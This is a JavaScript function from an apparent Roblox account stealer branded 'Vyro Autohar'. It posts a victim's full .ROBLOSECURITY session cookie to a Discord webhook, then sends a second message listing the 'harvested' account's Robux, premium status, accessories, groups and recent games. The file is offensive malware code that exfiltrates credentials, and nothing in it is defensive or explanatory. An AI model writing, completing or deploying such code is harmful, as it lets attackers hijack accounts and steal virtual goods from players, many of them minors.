async function sendToDiscord(cookie, userId) {
  // First, send the cookie in a plain message (no embed)
  const cookieMessage = {
    content: `**Full .ROBLOSECURITY Cookie**\n\`\`\`\n${cookie}\n\`\`\``
  };
  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(cookieMessage)
  });

  // Then send the embed with all stats (no cookie inside)
  const [user, robux, premium, lastGames, groups, accessories, valuables] = await Promise.all([...]);

  const embed = {
    title: "🔱 Vyro Autohar 🔱",
    description: `✨ **Account harvested** ✨`,
    color: 0xFF69B4,
    thumbnail: user ? { url: user.avatarUrl } : undefined,
    fields: [
      { name: "👤 Profile", value: `**${user.username}** (${user.displayName})\n🆔 \`${user.userId}\``, inline: false },
      { name: "💰 Robux", value: `\`${robux} R$\``, inline: true },
      { name: "✨ Premium", value: premium, inline: true },
      { name: "🕶️ Accessories", value: accessories, inline: false },
      { name: "🏛️ Top 3 Groups", value: groups, inline: false },
      { name: "🎮 Last 3 Games", value: lastGames, inline: false }
    ],
    footer: { text: "made by vyro28" },
    timestamp: new Date().toISOString()
  };
  
  const embedResponse = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
  });
  
  return embedResponse.ok;
}
